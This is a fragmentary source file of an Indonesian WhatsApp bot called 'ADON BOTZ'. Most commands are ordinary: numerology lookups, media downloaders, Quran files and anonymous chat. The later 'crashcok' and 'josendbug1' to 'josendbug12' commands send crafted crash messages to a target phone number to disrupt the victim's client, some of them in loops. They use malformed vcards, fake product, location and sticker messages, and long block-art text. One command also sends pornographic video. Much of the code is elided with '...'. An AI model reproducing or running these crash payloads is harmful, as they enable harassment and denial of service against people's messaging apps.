                if (!text) throw 'No Query Text'
                m.reply(mess.wait)
                adonbotz.sendMessage(m.chat, { image: { url: api('zenz', '/ephoto/' + command, { text: text }, 'apikey') }, caption: `Ephoto ${command}` }, { quoted: m })
            }
            break
	    case 'nomerhoki': case 'nomorhoki': {
	    if (!isCreator && !isBan) return
                if (!Number(text)) throw `Example : ${prefix + command} 6283137619111`
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return m.reply(anu.message)
                adonbotz.sendText(m.chat, `│➳ *Nomor HP :* ${anu.message.nomer_hp}\n│➳ *Angka Shuzi :* ${anu.message.angka_shuzi}\n│➳ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n│➳ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            break
            ...
            if (!isCreator && !isBan) return
                ...
                if (anu.status == false) return m.reply(anu.message)
                adonbotz.sendText(m.chat, `│➳ *Mimpi :* ${anu.message.mimpi}\n│➳ *Arti :* ${anu.message.arti}\n│➳ *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            ...
            if (!isCreator && !isBan) return
                ...
                if (anu.status == false) return m.reply(anu.message)
                adonbotz.sendText(m.chat, `│➳ *Nama Anda :* ${anu.message.nama_anda.nama}\n│➳ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n│➳ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n│➳ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            ...
            if (!isCreator && !isBan) return
                ...
                if (anu.status == false) return m.reply(anu.message)
                adonbotz.sendText(m.chat, `│➳ *Nama Suami :* ${anu.message.suami.nama}\n│➳ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n│➳ *Nama Istri :* ${anu.message.istri.nama}\n│➳ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            ...
            if (!isCreator && !isBan) return
                ...
                if (anu.status == false) return m.reply(anu.message)
                adonbotz.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Arti :* ${anu.message.arti}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            ...
            if (!isCreator && !isBan) return
                ...
                if (anu.status == false) return m.reply(anu.message)
                adonbotz.sendImage(m.chat,  anu.message.gambar, `│➳ *Nama Anda :* ${anu.message.nama_anda}\n│➳ *Nama Pasangan :* ${anu.message.nama_pasangan}\n│➳ *Sisi Positif :* ${anu.message.sisi_positif}\n│➳ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            ...
            if (!isCreator && !isBan) return
                ...
                if (anu.status == false) return m.reply(anu.message)
                adonbotz.sendText(m.chat, `│➳ *Tanggal Pernikahan :* ${anu.message.tanggal}\n│➳ *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case 'sifatusaha': {
            if (!isCreator && !isBan) return
                ...
                if (anu.status == false) return m.reply(anu.message)
                adonbotz.sendText(m.chat, `│➳ *Lahir :* ${anu.message.hari_lahir}\n│➳ *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            ...
            if (!isCreator && !isBan) return
                ...
                if (anu.status == false) return m.reply(anu.message)
                adonbotz.sendText(m.chat, `│➳ *Analisa :* ${anu.message.analisa}\n│➳ *Angka Akar :* ${anu.message.angka_akar}\n│➳ *Sifat :* ${anu.message.sifat}\n│➳ *Elemen :* ${anu.message.elemen}\n│➳ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            ...
            if (!isCreator && !isBan) return
                ...
                if (anu.status == false) return m.reply(anu.message)
                adonbotz.sendImage(m.chat, anu.message.image, `│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Simbol Tarot :* ${anu.message.simbol_tarot}\n│➳ *Arti :* ${anu.message.arti}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
            if (!isCreator && !isBan) return
            ...
            if (!isCreator && !isBan) return
                ...
                if (anu.status == false) return m.reply(anu.message)
                adonbotz.sendText(m.chat, `│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Kala Tinantang :* ${anu.message.kala_tinantang}\n│➳ *Info :* ${anu.message.info}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            ...
            if (!isCreator && !isBan) return
                ...
                if (anu.status == false) return m.reply(anu.message)
                adonbotz.sendText(m.chat, `│➳ *Hari Lahir :* ${anu.message.hari_lahir}\n│➳ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n│➳ *Hari Naas :* ${anu.message.hari_naas}\n│➳ *Info :* ${anu.message.catatan}\n│➳ *Catatan :* ${anu.message.info}`, m)
            }
            break
            ...
            if (!isCreator && !isBan) return
                ...
                if (anu.status == false) return m.reply(anu.message)
                adonbotz.sendText(m.chat, `│➳ *Tanggal :* ${anu.message.tanggal}\n│➳ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n│➳ *Watak Hari :* ${anu.message.watak_hari}\n│➳ *Naga Hari :* ${anu.message.naga_hari}\n│➳ *Jam Baik :* ${anu.message.jam_baik}\n│➳ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            ...
            if (!isCreator && !isBan) return
                ...
                if (anu.status == false) return m.reply(anu.message)
                adonbotz.sendText(m.chat, `│➳ *Tanggal :* ${anu.message.tgl_memancing}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
            if (!isCreator && !isBan) return
                ...
                if (anu.status == false) return m.reply(anu.message)
                adonbotz.sendText(m.chat, `│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            ...
            if (!isCreator && !isBan) return
                ...
                if (anu.status == false) return m.reply(anu.message)
                adonbotz.sendText(m.chat, `│➳ *Hasil :* ${anu.message}`, m)
            }
            break
		...
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply('Limit Harian Anda Telah Habis')
		    ...
		    db.data.users[m.sender].limit -= 1
                    ...
                    if (anu.status == false) return m.reply(anu.result.message)
                    adonbotz.sendMedia(m.chat, anu.caption.profile_hd, '', `│➳ Full Name : ${anu.caption.full_name}\n│➳ User Name : ${anu.caption.user_name}\n│➳ ID ${anu.caption.user_id}\n│➳ Followers : ${anu.caption.followers}\n│➳ Following : ${anu.caption.following}\n│➳ Bussines : ${anu.caption.bussines}\n│➳ Profesional : ${anu.caption.profesional}\n│➳ Verified : ${anu.caption.verified}\n│➳ Private : ${anu.caption.private}\n│➳ Bio : ${anu.caption.biography}\n│➳ Bio Url : ${anu.caption.bio_url}`, m)
		    db.data.users[m.sender].limit -= 1
            ...
            if (!isCreator && !isBan) return
                ...
                let msg = await adonbotz.sendMessage(m.chat, buttonMessage, { quoted: m })
                adonbotz.sendMessage(m.chat, { audio: { url: anu.result.audio }, mimetype: 'audio/mpeg'}, { quoted: msg })
            }
            break
	        ...
	        if (!isCreator && !isBan) return
                ...
                if (/(?:\/p\/|\/reel\/|\/tv\/)([^\s&]+)/.test(isUrl(text)[0])) {
                    ...
                    for (let media of anu.data) adonbotz.sendFileUrl(m.chat, media, `Download Url Instagram From ${isUrl(text)[0]}`, m)
                } else if (/\/stories\/([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson(api('zenz', '/downloader/instastory', { url: isUrl(text)[0] }, 'apikey'))
                    adonbotz.sendFileUrl(m.chat, anu.media[0].url, `Download Url Instagram From ${isUrl(text)[0]}`, m)
                }
            }
            break
            ...
            if (!isCreator && !isBan) return
                ...
                let msg = await adonbotz.sendImage(m.chat, anu.result.img, `│➳ Title : ${anu.result.lagu}\n│➳ Album : ${anu.result.album}\n│➳ Singer : ${anu.result.penyanyi}\n│➳ Publish : ${anu.result.publish}\n│➳ Lirik :\n${anu.result.lirik.result}`, m)
                adonbotz.sendMessage(m.chat, { audio: { url: anu.result.mp4aLink }, mimetype: 'audio/mpeg', fileName: anu.result.lagu+'.m4a' }, { quoted: msg })
            }
            break
            ...
            if (!isCreator && !isBan) return
                ...
                let msg = await adonbotz.sendImage(m.chat, anu.result.thumb, `│➳ Title : ${anu.result.title}\n│➳ Url : ${isUrl(text)[0]}`)
                adonbotz.sendMessage(m.chat, { audio: { url: anu.result.url }, mimetype: 'audio/mpeg', fileName: anu.result.title+'.m4a' }, { quoted: msg })
            }
            break
		    ...
		    image: { url: anu.result.thumb },
                ...
                let msg = await adonbotz.sendMessage(m.chat, buttonMessage, { quoted: m })
                adonbotz.sendMessage(m.chat, { audio: { url: anu.result.audio } }, { quoted: msg })
            }
            break
	        ...
	        if (!isCreator && !isBan) return
                ...
                adonbotz.sendMessage(m.chat, { video: { url: anu.result.url }, caption: `│➳ Title : ${anu.result.title}`}, { quoted: m })
            }
            break
	        ...
	        if (!isCreator && !isBan) return
                ...
                adonbotz.sendMessage(m.chat, { video: { url: anu.result }, caption: `Download From ${text}` }, { quoted: m })
            }
            break
...
`,
		    ...
		    anu.media.map(async (url) => {
		        adonbotz.sendMessage(m.chat, { image: { url }, caption: `│➳ Title : ${anu.title}\n│➳ Author : ${anu.author.name}\n│➳ Like : ${anu.like}\n│➳ Caption : ${anu.caption}` }, { quoted: m })
		    })
		}
	    }
	    break
		...
		let result = anu[Math.floor(Math.random() * anu.length)]
		adonbotz.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
		case 'iqra': {
		if (!isCreator && !isBan) return
		...
		adonbotz.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:m}).catch ((err) => m.reply(oh))
		}
		break
		case 'juzamma': {
		if (!isCreator && !isBan) return
		if (args[0] === 'pdf') {
		m.reply(mess.wait)
		adonbotz.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:m})
		} else if (args[0] === 'docx') {
		m.reply(mess.wait)
		adonbotz.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:m})
		} else if (args[0] === 'pptx') {
		m.reply(mess.wait)
		adonbotz.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:m})
		} else if (args[0] === 'xlsx') {
		m.reply(mess.wait)
		adonbotz.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:m})
		} else {
...
( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		adonbotz.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : m })
		}
		break
		case 'tafsirsurah': {
		if (!isCreator && !isBan) return
...
( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		...
		break
		   ...
		   if (!isCreator && !isBan) return
                ...
                adonbotz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
...
`.trim()
                adonbotz.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
                if (!isCreator && !isBan) return
...
Lihat list Pesan Dengan ${prefix}listmsg`)
            ...
            if (!isCreator && !isBan) return
                ...
                adonbotz.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
            if (!isCreator && !isBan) return
	    ...
	    if (!isCreator && !isBan) return
                ...
                adonbotz.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await adonbotz.getName(m.sender)} Welcome To Anonymous Chat\n\nKlik Button Dibawah Ini Untuk Mencari Partner\`\`\``, adonbotz.user.name, m)
            }
			break
            ...
            if (!isCreator && !isBan) return
                ...
                if (!room) {
                    ...
                    await adonbotz.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
                    throw false
                }
                m.reply('Ok')
                let other = room.other(m.sender)
                if (other) await adonbotz.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
            ...
            if (!isCreator && !isBan) return
                ...
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    ...
                    await adonbotz.sendButtonText(m.chat, buttons, `\`\`\`Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda\`\`\``, adonbotz.user.name, m)
                    throw false
                }
                ...
                if (room) {
                    ...
                    await adonbotz.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, adonbotz.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await adonbotz.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, adonbotz.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                    ...
                    await adonbotz.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, adonbotz.user.name, m)
                }
                break
            }
...
break
        ...
        if (stderr.trim()) m.reply(stderr)
            ...
            case 'owner': case 'creator': {
                adonbotz.sendContact(m.chat, global.owner, m)
            }
            break
            case 'playstore': {
            if (!isCreator) return
...
│➳ Detail: ${detail}`
            adonbotz.sendImage(m.chat, thumb, capt, m)
            }
            break
            case 'jadwalbioskop': {
            if (!isCreator) return
            ...
            adonbotz.sendImage(m.chat, res.result[0].thumb, capt, m)
            }
            break
            ...
            adonbotz.sendImage(m.chat, res.result[0].img, capt, m)
            }
            break
            case 'aminio': {
            if (!isCreator) return
            ...
            adonbotz.sendImage(m.chat, 'https://'+res.result[0].community_thumb, capt, m)
            }
            break
            case 'wattpad': {
            if (!isCreator) return
            ...
            adonbotz.sendImage(m.chat, res.result[0].thumbnail, capt, m)
            }
            break
            case 'setmenu': {
            if (!isCreator) return
            let setbot = db.data.settings[botNumber]
               if (args[0] === 'templateImage'){
                ...
                adonbotz.sendListMsg(m.chat, `Please select the menu you want to change!`, adonbotz.user.name, `Hello Owner !`, `Click Here`, sections, m)
                }
            }
            break
...
const turbrek = `break`
try {
m.reply(`BY ADON BOTT\n` + 'case ' + `'${args[0]}'` + fs.readFileSync('./adon.js').toString().split(`case '${args[0]}'`)[1].split(turbrek)[0] + turbrek)
} catch {
...
© ⏤͟͟͞𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉
`
adonbotz.sendMessage(m.chat, { image: {url: 'https://i.ibb.co/xHbpXYS/IMG-20221103-WA0008.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉`,
"body":`Runtime ${runtime(process.uptime())}`,
...
adonbotz.sendMessage(m.chat, { video: sugiono, mimetype: 'video/mp4', fileName: `${command}.mp4`}, { quoted: fdocjo })
jancok(`Tuh Bokep`)
}
break
 case 'crashcok':{
...
adonbotz.sendMessage(m.chat, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:fdoc})}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug1':{
if (!isCreator && !isBan) return
...
adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:fdoc})
...
adonbotz.sendMessage(m.chat, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:fdoc1})
adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:fdoc1})
...
adonbotz.sendMessage(m.chat, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:foto})}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug2':
if (!isCreator && !isBan) return
...
adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:foto})
...
adonbotz.sendMessage(m.chat, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:foto1})
adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:foto1})
...
adonbotz.sendMessage(m.chat, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:fvoc})}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug3':
if (!isCreator && !isBan) return
...
adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:fvoc})
...
adonbotz.sendMessage(m.chat, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:fvoc1})
adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:fvoc1})
...
adonbotz.sendMessage(m.chat, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:fgif})}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug4':
if (!isCreator && !isBan) return
...
adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:fgif})
...
adonbotz.sendMessage(m.chat, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:fgif1})
adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:fgif1})
...
message: {
liveLocationMessage: {
caption: `By: 𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉`,
jpegThumbnail: fs.readFileSync(`./pict.jpg`), 
}
}
}
adonbotz.sendMessage(m.chat, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:floc})}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break 
case 'josendbug5':
if (!isCreator && !isBan) return
...
adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:floc})
...
adonbotz.sendMessage(m.chat, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:floc1})
adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:floc1})
...
"jpegThumbnail": fs.readFileSync(`./pict.jpg`)}, 
"title": "𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉", 
"description": "𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉", 
"currencyCode": "USD", 
"priceAmount1000": "5000000000", 
"retailerId": "𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉", 
"productImageCount": 1}, 
"businessOwnerJid": `6283137619111@s.whatsapp.net`}}}	
adonbotz.sendMessage(m.chat, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:ftoko})}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug6':
if (!isCreator && !isBan) return
...
"productImageCount": 1}, 
"businessOwnerJid": `6283137619111@s.whatsapp.net`}}}	
adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:ftoko})
...
"productImageCount": 1}, 
"businessOwnerJid": `6283137619111@s.whatsapp.net`}}}
adonbotz.sendMessage(m.chat, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:ftoko1})
adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:ftoko1})
...
adonbotz.sendMessage(m.chat, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:foncevid})}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug7':
if (!isCreator && !isBan) return
...
adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:foncevid})
...
adonbotz.sendMessage(m.chat, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:foncevid1})
adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:foncevid1})
...
adonbotz.sendMessage(m.chat, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:fonceimg})}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug8':
if (!isCreator && !isBan) return
...
adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:fonceimg})
...
adonbotz.sendMessage(m.chat, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:fonceimg1})
adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:fonceimg1})
...
"caption": `𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉`,
 'jpegThumbnail': fs.readFileSync('./pict.jpg')}}}
adonbotz.sendMessage(m.chat, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:fgc})
}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug9':
...
"caption": `𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉`,
 'jpegThumbnail': fs.readFileSync('./pict.jpg')}}}
adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:fgc})
...
"caption": `𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉`,
 'jpegThumbnail': fs.readFileSync('./pict.jpg')}}}
 adonbotz.sendMessage(m.chat, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:fgc1})
adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:fgc1})
...
let stic = { 
"key": {
"participant": `6283137619111@s.whatsapp.net`,
"remoteJid": "",
"fromMe": false,
...
"status": "PENDING"
 ...
 adonbotz.sendMessage(m.chat, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:stic})
 }
 jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
 break
case 'josendbug10':
...
"status": "PENDING"
 ...
 adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:stic})
...
"status": "PENDING"
 ...
 adonbotz.sendMessage(m.chat, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:stic1})
 adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:stic1})
...
"displayName": `𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉`,
 ...
 "jpegThumbnail": fs.readFileSync('./pict.jpg')}}}
adonbotz.sendMessage(m.chat, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:fkon})
}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break 
case 'josendbug11':
...
"displayName": `𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉`,
 "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:Masih gw pikirin\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:No ku +353\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
 "jpegThumbnail": fs.readFileSync('./pict.jpg')}}}
adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:fkon})
...
"displayName": `𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉`,
 "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:Masih gw pikirin\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:No ku +353\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
 "jpegThumbnail": fs.readFileSync('./pict.jpg')}}}
 adonbotz.sendMessage(m.chat, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:fkon1})
adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:fkon1})
...
"groupName": `𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]`, 
"caption": `𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]`, 
'jpegThumbnail': virgam
}
}
}
adonbotz.sendMessage(m.chat, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:finv})
}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug12':
...
adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:finv})
...
adonbotz.sendMessage(m.chat, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:finv1})
adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉 [CRASH]"},{quoted:finv1})
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
            adonbotz.sendMessage(m.chat, {text:"🇹 🇭 🇪 🇱 🇮 🇲 🇦"},{quoted:fgamjo})
            }
            jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
            }
            break
...
///.........▓▓..........▓▓
`
await adonbotz.sendMessage(m.chat, {text:momoe},{quoted:fgamjo})
}
...
///.........▓▓..........▓▓
`
            await adonbotz.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:fgamjo})
